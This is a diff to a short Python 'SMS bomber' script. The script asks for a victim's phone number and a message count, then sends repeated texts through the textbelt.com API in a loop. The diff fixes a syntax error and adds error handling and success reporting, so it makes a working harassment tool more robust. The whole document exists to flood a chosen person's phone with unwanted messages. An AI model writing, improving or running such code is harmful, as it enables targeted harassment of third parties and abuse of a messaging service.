@@ -1,11 +1,19 @@
 import requests
 
-phone_number = input("Enter the phone number to bomb (with country code): ")
-amount = int(input("Enter the number of SMS to send: ")
+try:
+    phone_number = input("Enter the phone number to bomb (with country code): ")
+    amount = int(input("Enter the number of SMS to send: "))
 
-for _ in range(amount):
-    payload = {
-        'phone': phone_number,
-        'message': 'Hello, you have been bombed with SMS!'
-    }
-    requests.post('https://textbelt.com/text', data=payload)
+    for _ in range(amount):
+        payload = {
+            'phone': phone_number,
+            'message': 'Hello, you have been bombed with SMS!'
+        }
+        response = requests.post('https://textbelt.com/text', data=payload)
+        
+        if response.status_code != 200:
+            print(f"Failed to send SMS. Status Code: {response.status_code}")
+        else:
+            print("SMS sent successfully!")
+except Exception as e:
+    print(f"An error occurred: {e}")
